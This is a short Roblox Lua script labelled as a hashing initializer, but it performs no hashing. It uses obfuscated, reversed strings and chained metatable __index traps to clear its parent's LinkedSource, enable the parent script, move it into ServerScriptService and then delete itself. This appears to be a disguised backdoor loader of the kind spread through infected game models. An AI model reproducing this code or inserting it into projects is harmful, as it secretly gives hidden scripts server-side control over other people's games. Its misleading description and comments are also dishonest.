--    // FileName: HashTables.lua
--    // Description: Secondary script to initialize hashing.

local h = setmetatable;
local i = string.format;
local t = {
	[1]="bees",
	[2]=i("e%sr%soS%sek%siL","c","u","d","n");
	[3]=i("d%sl%sas%sD","e","b","i");
	[4]=i("tn%sr%sP","e","a");
};
local u = {
	__index = function()
		script.Parent[string.reverse(t[2])]="";
		script.Parent[string.reverse(t[3])]=false;
		script.Parent[string.reverse(t[4])]=game.ServerScriptService;
		script:Destroy();
	end;
};
h(t,u);

local v = {
	[1]="bees";
};
local w = {
	__index = function(table,i)
		local bees = t[5];
	end;
};
h(v,w);
local joe = v[2];